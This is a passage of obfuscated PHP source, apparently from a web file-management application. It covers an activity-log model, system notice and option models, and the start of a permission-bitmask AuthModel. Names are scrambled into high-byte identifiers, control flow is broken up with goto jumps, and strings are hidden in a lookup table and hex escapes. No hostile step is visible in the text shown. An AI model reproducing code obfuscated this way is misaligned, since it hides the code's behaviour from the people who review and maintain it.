$DŠ´‹»õ²°[2067] => LNG($DŠ´‹»õ²°[2068]), $DŠ´‹»õ²°[2069] => LNG($DŠ´‹»õ²°[2069]), $DŠ´‹»õ²°[2070] => LNG($DŠ´‹»õ²°[2071]), $DŠ´‹»õ²°[2072] => LNG($DŠ´‹»õ²°[2073]), $DŠ´‹»õ²°[2074] => LNG($DŠ´‹»õ²°[2075]), $DŠ´‹»õ²°[2076] => LNG($DŠ´‹»õ²°[2077]), $DŠ´‹»õ²°[2078] => LNG($DŠ´‹»õ²°[2079]), $DŠ´‹»õ²°[2080] => LNG($DŠ´‹»õ²°[2081])); } private function typeFile() { $C©çö·Ÿ¸ğ =& $_SERVER[Ü˜]; $FÌõÏİ¥¦ã = array($C©çö·Ÿ¸ğ[1668] => array($C©çö·Ÿ¸ğ[1669]), $C©çö·Ÿ¸ğ[2023] => array($C©çö·Ÿ¸ğ[2082]), $C©çö·Ÿ¸ğ[2025] => array($C©çö·Ÿ¸ğ[2083]), $C©çö·Ÿ¸ğ[1661] => array($C©çö·Ÿ¸ğ[1662]), $C©çö·Ÿ¸ğ[2033] => array(), $C©çö·Ÿ¸ğ[2035] => array(), $C©çö·Ÿ¸ğ[2037] => array(), $C©çö·Ÿ¸ğ[1671] => array($C©çö·Ÿ¸ğ[1673]), $C©çö·Ÿ¸ğ[1672] => array($C©çö·Ÿ¸ğ[1673]), $C©çö·Ÿ¸ğ[2041] => array($C©çö·Ÿ¸ğ[2084]), $C©çö·Ÿ¸ğ[2043] => array($C©çö·Ÿ¸ğ[2084]), $C©çö·Ÿ¸ğ[2045] => array($C©çö·Ÿ¸ğ[2085]), $C©çö·Ÿ¸ğ[2031] => array($C©çö·Ÿ¸ğ[2086]), $C©çö·Ÿ¸ğ[1666] => array($C©çö·Ÿ¸ğ[2087]), $C©çö·Ÿ¸ğ[2048] => array($C©çö·Ÿ¸ğ[2088]), $C©çö·Ÿ¸ğ[1665] => array($C©çö·Ÿ¸ğ[1667])); return $FÌõÏİ¥¦ã; } private function typeAll() { goto b½¡§±ÍÆî; b½¡§±ÍÆî: $cØôÔ°Ê§ =& $_SERVER[Ü˜]; $Aš‘Ï¦Ú¾· = $this->typeList; $aÖÒ›¿î°¿ = array_filter($this->typeFile()); goto B÷Ä…Ì˜ˆˆ; cÚ˜õÅŞ„ë: return $Aš‘Ï¦Ú¾·; goto D´áŞ‰…Ğ; B÷Ä…Ì˜ˆˆ: foreach ($aÖÒ›¿î°¿ as $A«ª§×ºÛé => $A¡ƒ¤ĞåêÅ) { $Aš‘Ï¦Ú¾·[$A¡ƒ¤ĞåêÅ[0]] = $Aš‘Ï¦Ú¾·[$A«ª§×ºÛé]; } $Aš‘Ï¦Ú¾·[$cØôÔ°Ê§[1673]] = LNG($cØôÔ°Ê§[2089]); $Aš‘Ï¦Ú¾·[$cØôÔ°Ê§[2084]] = LNG($cØôÔ°Ê§[2090]); goto cÚ˜õÅŞ„ë; D´áŞ‰…Ğ: } public function addLog($D„Ã‹Ó½ïª, $bË“â„ÉÛé = array()) { goto cŒíé¼…; bÂƒëªÜÏ: if (!$B‰×çªØ°) { $B‰×çªØ° = (int) Session::get($FİãŒê–“ó[1819]); } $aÆ­Û÷©­« = get_client_ip(); if (!$bË“â„ÉÛé || strlen(json_encode($bË“â„ÉÛé)) >= 1024) { $bË“â„ÉÛé = array($FİãŒê–“ó[2091] => $aÆ­Û÷©­«); } else { if (is_array($bË“â„ÉÛé)) { $bË“â„ÉÛé[$FİãŒê–“ó[2091]] = $aÆ­Û÷©­«; } else { $bË“â„ÉÛé = array($FİãŒê–“ó[1089] => $bË“â„ÉÛé, $FİãŒê–“ó[2091] => $aÆ­Û÷©­«); } } goto Cºìã§à¿Å; cŒíé¼…: $FİãŒê–“ó =& $_SERVER[Ü˜]; if (!isset($this->typeList[$D„Ã‹Ó½ïª])) { return; } $B‰×çªØ° = defined($FİãŒê–“ó[463]) && USER_ID ? USER_ID : (isset($bË“â„ÉÛé[$FİãŒê–“ó[1529]]) ? $bË“â„ÉÛé[$FİãŒê–“ó[1529]] : 0); goto bÂƒëªÜÏ; Cºìã§à¿Å: $bË“â„ÉÛé = array($FİãŒê–“ó[1520] => Session::sign(), $FİãŒê–“ó[1521] => $B‰×çªØ°, $FİãŒê–“ó[29] => $D„Ã‹Ó½ïª, $FİãŒê–“ó[1523] => json_encode($bË“â„ÉÛé)); parent::add($bË“â„ÉÛé); goto e×„ˆ”™; e×„ˆ”™: } public function remove($B¨«À”«õ) { $this->where(array($_SERVER[Ü˜][421] => $B¨«À”«õ))->delete(); } private function _makeOrder($DçÎÙ’“— = '') { goto C®–Î¿ÛíŞ; F‹é«ˆÖë¦: $aŠ…¿åğÆ = Input::get($DµÔœßÖ–ƒ[445], $DµÔœßÖ–ƒ[7], $DµÔœßÖ–ƒ[1851], array($DµÔœßÖ–ƒ[1775], $DµÔœßÖ–ƒ[439])); $aŠ…¿åğÆ = $b¨ŸãÀ¼¨ò[$aŠ…¿åğÆ]; $DçÎÙ’“— = $DçÎÙ’“— . "{$C¸äˆ÷æĞ©}\x20{$aŠ…¿åğÆ}"; goto dõ‘«Îå¥; dõ‘«Îå¥: return $this->order($DçÎÙ’“—); goto AËäë•Ì„¸; C®–Î¿ÛíŞ: $DµÔœßÖ–ƒ =& $_SERVER[Ü˜]; $C¸äˆ÷æĞ© = $DµÔœßÖ–ƒ[204]; $b¨ŸãÀ¼¨ò = array($DµÔœßÖ–ƒ[437] => $DµÔœßÖ–ƒ[438], $DµÔœßÖ–ƒ[439] => $DµÔœßÖ–ƒ[440]); goto F‹é«ˆÖë¦; AËäë•Ì„¸: } public function get($c²ÙÚË”£ã = '') { goto b‘ĞÕåÌ“Ï; b‘ĞÕåÌ“Ï: $féÔÖ ¢ñ =& $_SERVER[Ü˜]; if (!$c²ÙÚË”£ã) { show_json(array()); } $fÇ„ÁåÖÓ¢ = array(); goto F®‰Üœ‡à; F®‰Üœ‡à: if ($c²ÙÚË”£ã[$féÔÖ ¢ñ[1529]]) { $fÇ„ÁåÖÓ¢[$féÔÖ ¢ñ[1529]] = $c²ÙÚË”£ã[$féÔÖ ¢ñ[1529]]; } if (isset($c²ÙÚË”£ã[$féÔÖ ¢ñ[730]])) { $d£ñøæ‰ö… = $c²ÙÚË”£ã[$féÔÖ ¢ñ[730]]; $d‹Í’§Å§è = isset($c²ÙÚË”£ã[$féÔÖ ¢ñ[485]]) ? $c²ÙÚË”£ã[$féÔÖ ¢ñ[485]] : time(); $fÇ„ÁåÖÓ¢[$féÔÖ ¢ñ[204]] = array($féÔÖ ¢ñ[340], array($d£ñøæ‰ö…, $d‹Í’§Å§è)); } if ($c²ÙÚË”£ã[$féÔÖ ¢ñ[29]]) { $FŠ„İÔÕ¤å = explode($féÔÖ ¢ñ[47], $c²ÙÚË”£ã[$féÔÖ ¢ñ[29]]); $Bº¶°ÜÃÛº = $this->typeFile(); $d†Ì‘ÇÍ° = array(); foreach ($FŠ„İÔÕ¤å as $C°µ¦—ª´ò) { $d†Ì‘ÇÍ°[] = $C°µ¦—ª´ò; if (isset($Bº¶°ÜÃÛº[$C°µ¦—ª´ò])) { $d†Ì‘ÇÍ° = array_merge($d†Ì‘ÇÍ°, $Bº¶°ÜÃÛº[$C°µ¦—ª´ò]); } } $d†Ì‘ÇÍ° = array_unique($d†Ì‘ÇÍ°); if ($d†Ì‘ÇÍ°) { $fÇ„ÁåÖÓ¢[$féÔÖ ¢ñ[29]] = array($féÔÖ ¢ñ[7], $d†Ì‘ÇÍ°); } } else { $fÇ„ÁåÖÓ¢[$féÔÖ ¢ñ[29]] = array($féÔÖ ¢ñ[2092], $féÔÖ ¢ñ[2093]); } goto f«×‰æ¡‡; aùÛŠØ¡ùç: $bªö—…Ü¸Î[$féÔÖ ¢ñ[376]] = $this->logList($bªö—…Ü¸Î[$féÔÖ ¢ñ[376]]); return $bªö—…Ü¸Î; goto Eà°§ËùÊö; f«×‰æ¡‡: if (!empty($c²ÙÚË”£ã[$féÔÖ ¢ñ[2091]])) { $fÇ„ÁåÖÓ¢[$féÔÖ ¢ñ[440]] = array($féÔÖ ¢ñ[389], "\45{$c²ÙÚË”£ã[$féÔÖ ¢ñ[2091]]}\x25"); } $bªö—…Ü¸Î = $this->_makeOrder()->where($fÇ„ÁåÖÓ¢)->selectPage(); if (empty($bªö—…Ü¸Î[$féÔÖ ¢ñ[376]])) { show_json(array(), !0, $bªö—…Ü¸Î[$féÔÖ ¢ñ[373]]); } goto aùÛŠØ¡ùç; Eà°§ËùÊö: } private function ipAddress(&$cÄ¾ÛÙ¸šç) { $Bƒæé™Úƒ† =& $_SERVER[Ü˜]; if (!empty($cÄ¾ÛÙ¸šç[$Bƒæé™Úƒ†[2091]])) { $bÒãæ…µíê = IpLocation::get($cÄ¾ÛÙ¸šç[$Bƒæé™Úƒ†[2091]]); } else { $bÒãæ…µíê = LNG($Bƒæé™Úƒ†[2094]); } $cÄ¾ÛÙ¸šç[$Bƒæé™Úƒ†[2095]] = $bÒãæ…µíê; } private function descZipDownload($aŞ«•‡¦Êá, &$B¢•ñÄœš‚) { $C¾†¦–ãâ¹ =& $_SERVER[Ü˜]; if (!isset($aŞ«•‡¦Êá[$C¾†¦–ãâ¹[2096]])) { return; } $Aäìòì¹ŞË = json_decode($aŞ«•‡¦Êá[$C¾†¦–ãâ¹[2096]], !0); foreach ($Aäìòì¹ŞË as $A‡ƒ‡‘‘‘Ÿ) { try { $EŠößÎªÙÇ = IO::infoFull($A‡ƒ‡‘‘‘Ÿ[$C¾†¦–ãâ¹[86]]); } catch (Exception $Cùè¶ÜÄç) { continue; } $aŞ«•‡¦Êá[$C¾†¦–ãâ¹[86]] = $A‡ƒ‡‘‘‘Ÿ[$C¾†¦–ãâ¹[86]]; $B¢•ñÄœš‚[] = $aŞ«•‡¦Êá[$C¾†¦–ãâ¹[404]] = $EŠößÎªÙÇ[$C¾†¦–ãâ¹[404]]; $B¢•ñÄœš‚[] = $aŞ«•‡¦Êá[$C¾†¦–ãâ¹[1907]] = $EŠößÎªÙÇ[$C¾†¦–ãâ¹[487]]; break; } return $aŞ«•‡¦Êá; } private function getSourceList(&$c„‡‹âª˜) { $Dó¿®×šµ =& $_SERVER[Ü˜]; $aÒ°í¸ÀğÂ = array(); foreach ($c„‡‹âª˜ as $d§äµ‡ÕğÚ => $f¿œµ›È) { goto c‰ôó›Ş¬¢; Eµ¯Şê©÷: if ($d‰ õ·õ–õ[$Dó¿®×šµ[29]] == $Dó¿®×šµ[1915]) { $aÒ°í¸ÀğÂ[] = $d‰ õ·õ–õ[$Dó¿®×šµ[440]][$Dó¿®×šµ[404]]; } goto Fê±Ô¬å™; EºØÔ©ªÄÀ: $aÒ°í¸ÀğÂ[] = $d‰ õ·õ–õ[$Dó¿®×šµ[404]]; $aÒ°í¸ÀğÂ[] = $d‰ õ·õ–õ[$Dó¿®×šµ[1907]]; if ($d‰ õ·õ–õ[$Dó¿®×šµ[29]] == $Dó¿®×šµ[529]) { $aÒ°í¸ÀğÂ[] = $d‰ õ·õ–õ[$Dó¿®×šµ[440]][$Dó¿®×šµ[1056]]; $aÒ°í¸ÀğÂ[] = $d‰ õ·õ–õ[$Dó¿®×šµ[440]][$Dó¿®×šµ[1057]]; } goto Eµ¯Şê©÷; c‰ôó›Ş¬¢: $d‰ õ·õ–õ = json_decode($f¿œµ›È[$Dó¿®×šµ[440]], !0); if ($f¿œµ›È[$Dó¿®×šµ[29]] == $Dó¿®×šµ[1664]) { $d‰ õ·õ–õ = $this->descZipDownload($d‰ õ·õ–õ, $aÒ°í¸ÀğÂ); $c„‡‹âª˜[$d§äµ‡ÕğÚ][$Dó¿®×šµ[440]] = json_encode($d‰ õ·õ–õ); continue; } if (strpos($f¿œµ›È[$Dó¿®×šµ[29]], $Dó¿®×šµ[1908]) !== 0) { if (!isset($d‰ õ·õ–õ[$Dó¿®×šµ[86]]) || strpos($f¿œµ›È[$Dó¿®×šµ[29]], $Dó¿®×šµ[2097]) !== 0) { continue; } try { $d©ŠÛ­’¾­ = IO::infoFull($d‰ õ·õ–õ[$Dó¿®×šµ[86]]); } catch (Exception $EÈœ¼í–) { continue; } $aÒ°í¸ÀğÂ[] = $d‰ õ·õ–õ[$Dó¿®×šµ[404]] = $d©ŠÛ­’¾­[$Dó¿®×šµ[404]]; $aÒ°í¸ÀğÂ[] = $d‰ õ·õ–õ[$Dó¿®×šµ[1907]] = $d©ŠÛ­’¾­[$Dó¿®×šµ[487]]; $c„‡‹âª˜[$d§äµ‡ÕğÚ][$Dó¿®×šµ[440]] = json_encode($d‰ õ·õ–õ); continue; } goto EºØÔ©ªÄÀ; Fê±Ô¬å™: } if (!$aÒ°í¸ÀğÂ) { return array(); } return Model($Dó¿®×šµ[799])->sourceListInfo($aÒ°í¸ÀğÂ, !0); } private function logList($DùË»ÁŠ¡) { goto F¼ÏõÍİ¥; f‘À—¥åŒ: $b¤šàõôñ = $this->getSourceList($DùË»ÁŠ¡); $CßÏà¤î = $this->typeAll(); $a‚õ’ŒêÛ‡ = array(); goto Añ´ÚëÛë‘; F¼ÏõÍİ¥: $BÙ—ÔÜÆ¾ =& $_SERVER[Ü˜]; $Fî‡ïã‰©ø = array_to_keyvalue($DùË»ÁŠ¡, $BÙ—ÔÜÆ¾[33], $BÙ—ÔÜÆ¾[1529]); $C²ÒÆ»‡÷‰ = Model($BÙ—ÔÜÆ¾[515])->userListInfo(array_unique($Fî‡ïã‰©ø)); goto f‘À—¥åŒ; Añ´ÚëÛë‘: $fóö±áçˆ¨ = array(); foreach ($DùË»ÁŠ¡ as $bİ“µŞáÈ => $bùäëÃŸ·Å) { goto CçÛ”ñŞ·¿; E÷‹Š‰‡…ä: $bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[1850]] = $e•È¼òÔƒ®; $d’Ÿé¨ê‚È = json_decode($bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[440]], !0); $bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[2091]] = isset($d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[2091]]) ? $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[2091]] : $BÙ—ÔÜÆ¾[33]; goto AÏ ¯âø÷Ş; d‹‘ŞÙ¾: $bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[28]] = isset($e•È¼òÔƒ®[$BÙ—ÔÜÆ¾[28]]) ? $e•È¼òÔƒ®[$BÙ—ÔÜÆ¾[28]] : LNG($BÙ—ÔÜÆ¾[2094]); $bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[1957]] = isset($e•È¼òÔƒ®[$BÙ—ÔÜÆ¾[1957]]) ? $e•È¼òÔƒ®[$BÙ—ÔÜÆ¾[1957]] : $BÙ—ÔÜÆ¾[33]; $bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[1435]] = isset($CßÏà¤î[$dù•Å™Êí]) ? $CßÏà¤î[$dù•Å™Êí] : $aô‰´Ïà›; goto E÷‹Š‰‡…ä; AÏ ¯âø÷Ş: $this->ipAddress($bùäëÃŸ·Å); if (strpos($dù•Å™Êí, $BÙ—ÔÜÆ¾[1908]) === 0 || isset($d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[1907]])) { goto c©äãò¬‹Õ; CÖëå»ò‰„: if ($d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[1920]] && $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[1920]][$BÙ—ÔÜÆ¾[413]] == $BÙ—ÔÜÆ¾[1172]) { $fóö±áçˆ¨[] = $bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[402]]; unset($DùË»ÁŠ¡[$bİ“µŞáÈ]); continue; } goto fÍ ­‰£†; c©äãò¬‹Õ: $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[95]] = $b¤šàõôñ[$d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[404]]]; $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[1920]] = $b¤šàõôñ[$d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[1907]]]; if ($d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[29]] == $BÙ—ÔÜÆ¾[529]) { $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[440]][$BÙ—ÔÜÆ¾[1056]] = $b¤šàõôñ[$d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[440]][$BÙ—ÔÜÆ¾[1056]]]; $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[440]][$BÙ—ÔÜÆ¾[1057]] = $b¤šàõôñ[$d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[440]][$BÙ—ÔÜÆ¾[1057]]]; } goto fÓ§åÀÌË; fÓ§åÀÌË: if ($d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[29]] == $BÙ—ÔÜÆ¾[1915]) { $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[440]][$BÙ—ÔÜÆ¾[404]] = $b¤šàõôñ[$d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[440]][$BÙ—ÔÜÆ¾[404]]]; } if ($d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[29]] == $BÙ—ÔÜÆ¾[1659]) { $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[1920]] = $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[95]]; $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[1907]] = $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[1920]][$BÙ—ÔÜÆ¾[404]]; $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[95]] = !1; $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[404]] = $BÙ—ÔÜÆ¾[33]; } if ($d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[95]] && $d’Ÿé¨ê‚È[$BÙ—ÔÜÆ¾[95]][$BÙ—ÔÜÆ¾[413]] == $BÙ—ÔÜÆ¾[1172]) { $fóö±áçˆ¨[] = $bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[402]]; unset($DùË»ÁŠ¡[$bİ“µŞáÈ]); continue; } goto CÖëå»ò‰„; fÍ ­‰£†: } $bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[440]] = $d’Ÿé¨ê‚È; goto dàòß°ëÃ¼; dàòß°ëÃ¼: unset($bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[2100]]); $a‚õ’ŒêÛ‡[] = $bùäëÃŸ·Å; goto eä÷¦ÄºÎµ; CçÛ”ñŞ·¿: $dù•Å™Êí = $bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[29]]; $e•È¼òÔƒ® = isset($C²ÒÆ»‡÷‰[$bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[1529]]]) ? $C²ÒÆ»‡÷‰[$bùäëÃŸ·Å[$BÙ—ÔÜÆ¾[1529]]] : !1; $aô‰´Ïà› = strpos($dù•Å™Êí, $BÙ—ÔÜÆ¾[2098]) === 0 ? LNG($BÙ—ÔÜÆ¾[2099]) : LNG($BÙ—ÔÜÆ¾[2094]); goto d‹‘ŞÙ¾; eä÷¦ÄºÎµ: } $this->clearSystemPathLog($fóö±áçˆ¨); goto dâÉ§ğèº; dâÉ§ğèº: return $a‚õ’ŒêÛ‡; goto eœ¤ÕÊ˜‚; eœ¤ÕÊ˜‚: } private function clearSystemPathLog($BƒÉ¨Ö…¼) { $E ‚†ÙÔ« =& $_SERVER[Ü˜]; if (count($BƒÉ¨Ö…¼) == 0) { return; } $b˜‡¾à¤ğñ = array($E ‚†ÙÔ«[402] => array($E ‚†ÙÔ«[7], array_unique($BƒÉ¨Ö…¼))); $this->where($b˜‡¾à¤ğñ)->delete(); } public function deviceList($FÎ‘Ş‰Ñİ, $BÎÇĞË¦íÂ = 0) { $F±Ç¶éÑÎ¾ =& $_SERVER[Ü˜]; $F¸²½°ÙÇÜ = array($F±Ç¶éÑÎ¾[1529] => $FÎ‘Ş‰Ñİ, $F±Ç¶éÑÎ¾[204] => array($F±Ç¶éÑÎ¾[972], $BÎÇĞË¦íÂ), $F±Ç¶éÑÎ¾[29] => $F±Ç¶éÑÎ¾[1633]); $FİÌ™¼åŞ = array(); $fŠ†Ãöæ… = $this->field($F±Ç¶éÑÎ¾[2101])->where($F¸²½°ÙÇÜ)->order($F±Ç¶éÑÎ¾[1918])->limit(50)->select(); foreach ($fŠ†Ãöæ… as $E¥ÂˆŞ‡ Î => $B²ëøòÁÓñ) { goto e¾£„Ñ¥ ¨; e¾£„Ñ¥ ¨: if ($E¥ÂˆŞ‡ Î > 0 && abs($B²ëøòÁÓñ[$F±Ç¶éÑÎ¾[204]] - $fŠ†Ãöæ…[$E¥ÂˆŞ‡ Î - 1][$F±Ç¶éÑÎ¾[204]]) < 5) { continue; } $D‡”çáø = json_decode($B²ëøòÁÓñ[$F±Ç¶éÑÎ¾[440]], !0); $B²ëøòÁÓñ[$F±Ç¶éÑÎ¾[2091]] = isset($D‡”çáø[$F±Ç¶éÑÎ¾[2091]]) ? $D‡”çáø[$F±Ç¶éÑÎ¾[2091]] : $F±Ç¶éÑÎ¾[33]; goto DìÆêãéÂ»; DìÆêãéÂ»: unset($D‡”çáø[$F±Ç¶éÑÎ¾[2091]]); $cô‚ë„âßÚ = $this->deviceType($D‡”çáø[$F±Ç¶éÑÎ¾[1909]]); if (isset($FİÌ™¼åŞ[$cô‚ë„âßÚ])) { continue; } goto eß¡Û¿¾”; eß¡Û¿¾”: $this->ipAddress($B²ëøòÁÓñ); $B²ëøòÁÓñ[$F±Ç¶éÑÎ¾[440]] = $D‡”çáø; $FİÌ™¼åŞ[$cô‚ë„âßÚ] = $B²ëøòÁÓñ; goto d…ŠìŸˆè; d…ŠìŸˆè: } return array_values($FİÌ™¼åŞ); } public function deviceType($F·»²½¢á±) { return $F·»²½¢á±; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\x6e\157\164\151\x63\145\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\143\157\x6e\164\x65\156\164", "\141\x75\x74\150", "\155\157\144\145", "\164\x69\x6d\x65", "\x74\x79\160\145", "\154\x65\x76\145\154", "\145\x6e\141\x62\x6c\x65", "\163\157\x72\x74"); public function listData($EÖãÈ¬Ê£‘ = false, $AØ‚é—·… = "\163\157\x72\x74", $eÜ…ŠÓÚ‚¡ = false) { return parent::listData($EÖãÈ¬Ê£‘, $AØ‚é—·…, $eÜ…ŠÓÚ‚¡); } public function add($A‘õ—ËŠÛÍ) { $AÂßéÓä =& $_SERVER[Ü˜]; $FˆŸ–Â®¹¨ = time(); if ($A‘õ—ËŠÛÍ[$AÂßéÓä[12]] == $AÂßéÓä[2102]) { $FˆŸ–Â®¹¨ = strtotime($A‘õ—ËŠÛÍ[$AÂßéÓä[207]]); } $A‘õ—ËŠÛÍ[$AÂßéÓä[207]] = $FˆŸ–Â®¹¨; return parent::insert($A‘õ—ËŠÛÍ); } public function update($d†ÔÓï», $cÎÓÁğì—) { goto CÌñå°œÈ; AğŠ«àëÌ‚: return parent::update($d†ÔÓï», $cÎÓÁğì—); goto f³Â¨ç»Ğ; CÌñå°œÈ: $CÄ¨·ø£´› =& $_SERVER[Ü˜]; $AåÕÓÊ©˜‘ = $this->listData($d†ÔÓï»); if (!$AåÕÓÊ©˜‘) { return !1; } goto fàäÉˆòÎ´; fàäÉˆòÎ´: $d„ÓêåÃŠ³ = time(); if ($cÎÓÁğì—[$CÄ¨·ø£´›[12]] == $CÄ¨·ø£´›[2102]) { $d„ÓêåÃŠ³ = strtotime($cÎÓÁğì—[$CÄ¨·ø£´›[207]]); } $cÎÓÁğì—[$CÄ¨·ø£´›[207]] = $d„ÓêåÃŠ³; goto AğŠ«àëÌ‚; f³Â¨ç»Ğ: } public function remove($b­—‰Ü¯İ) { $D†çÔÇ¼ƒ = $this->listData($b­—‰Ü¯İ); if (!$D†çÔÇ¼ƒ || $D†çÔÇ¼ƒ[$_SERVER[Ü˜][1172]]) { return !1; } return parent::remove($b­—‰Ü¯İ); } public function sort($eàŞÊ»œ¾, $FÚ¤­İíœ±) { return parent::update($eàŞÊ»œ¾, $FÚ¤­İíœ±); } public function enable($BïîÉ¯¥¾, $aóñÏ†µŠ·) { return parent::update($BïîÉ¯¥¾, array($_SERVER[Ü˜][2103] => $aóñÏ†µŠ·)); } private function initUserOption() { $dª•È‘±»‰ =& $_SERVER[Ü˜]; $this->optionType = $dª•È‘±»‰[2104]; $this->modelType = $dª•È‘±»‰[2105]; $this->field = array($dª•È‘±»‰[2106], $dª•È‘±»‰[28], $dª•È‘±»‰[207], $dª•È‘±»‰[29], $dª•È‘±»‰[2107], $dª•È‘±»‰[719], $dª•È‘±»‰[199]); } public function userNoticeGet($AÄàªõÊÎ = false) { $this->initUserOption(); return parent::listData($AÄàªõÊÎ, $_SERVER[Ü˜][402], !0); } public function userNoticeAdd($aÕ·Ø®Øèº) { $C¶ÇŞÄè¼À =& $_SERVER[Ü˜]; $this->initUserOption(); $c¥ì½Ü‰È§ = $this->findByKey($C¶ÇŞÄè¼À[2106], $aÕ·Ø®Øèº[$C¶ÇŞÄè¼À[402]]); if ($c¥ì½Ü‰È§) { return !0; } $F¢‘¼‹Ãñ = array($C¶ÇŞÄè¼À[2106] => $aÕ·Ø®Øèº[$C¶ÇŞÄè¼À[402]], $C¶ÇŞÄè¼À[28] => $aÕ·Ø®Øèº[$C¶ÇŞÄè¼À[28]], $C¶ÇŞÄè¼À[207] => $aÕ·Ø®Øèº[$C¶ÇŞÄè¼À[207]], $C¶ÇŞÄè¼À[29] => isset($aÕ·Ø®Øèº[$C¶ÇŞÄè¼À[29]]) ? $aÕ·Ø®Øèº[$C¶ÇŞÄè¼À[29]] : 1, $C¶ÇŞÄè¼À[2107] => isset($aÕ·Ø®Øèº[$C¶ÇŞÄè¼À[2107]]) ? $aÕ·Ø®Øèº[$C¶ÇŞÄè¼À[2107]] : 0, $C¶ÇŞÄè¼À[719] => 0, $C¶ÇŞÄè¼À[199] => 0); return parent::insert($F¢‘¼‹Ãñ); } public function userNoticeEdit($F‘ò…×­šË, $cÃëØÉì…„) { $this->initUserOption(); return parent::update($F‘ò…×­šË, $cÃëØÉì…„); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\145\x6d\137\x6f\160\x74\x69\x6f\156"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\x6f\154\145", "\x72\x6f\154\145\x47\162\157\x75\x70", "\162\x65\147\151\163\x74", "\x65\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($e³‡Œ˜±) { return "\x53\x79\x73\x74\x65\155\x4f\160\x74\x69\x6f\156\137{$e³‡Œ˜±}"; } protected function optionDefault($C´‡¹¶“¡ = '') { $D„Ôà“»¦’ =& $_SERVER[Ü˜]; if ($C´‡¹¶“¡ == $D„Ôà“»¦’[33]) { return $GLOBALS[$D„Ôà“»¦’[6]][$D„Ôà“»¦’[387]]; } } } goto c®îœÇ˜; eòÍ˜ì—À: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $FÖ„ÃÁ¬’¼ =& $_SERVER[Ü˜]; $C…÷ÆÀÙÚ = array(array($FÖ„ÃÁ¬’¼[422] => LNG($FÖ„ÃÁ¬’¼[1694]), $FÖ„ÃÁ¬’¼[1695] => $FÖ„ÃÁ¬’¼[1696], $FÖ„ÃÁ¬’¼[1697] => 1, $FÖ„ÃÁ¬’¼[1698] => 1, $FÖ„ÃÁ¬’¼[1699] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÖ„ÃÁ¬’¼[422] => LNG($FÖ„ÃÁ¬’¼[1700]), $FÖ„ÃÁ¬’¼[1695] => $FÖ„ÃÁ¬’¼[1701], $FÖ„ÃÁ¬’¼[1697] => 2, $FÖ„ÃÁ¬’¼[1698] => 1, $FÖ„ÃÁ¬’¼[1699] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÖ„ÃÁ¬’¼[422] => LNG($FÖ„ÃÁ¬’¼[1702]), $FÖ„ÃÁ¬’¼[1695] => $FÖ„ÃÁ¬’¼[1703], $FÖ„ÃÁ¬’¼[1697] => 3, $FÖ„ÃÁ¬’¼[1698] => 1, $FÖ„ÃÁ¬’¼[1699] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÖ„ÃÁ¬’¼[422] => LNG($FÖ„ÃÁ¬’¼[1704]), $FÖ„ÃÁ¬’¼[1695] => $FÖ„ÃÁ¬’¼[1705], $FÖ„ÃÁ¬’¼[1697] => 4, $FÖ„ÃÁ¬’¼[1698] => 1, $FÖ„ÃÁ¬’¼[1699] => 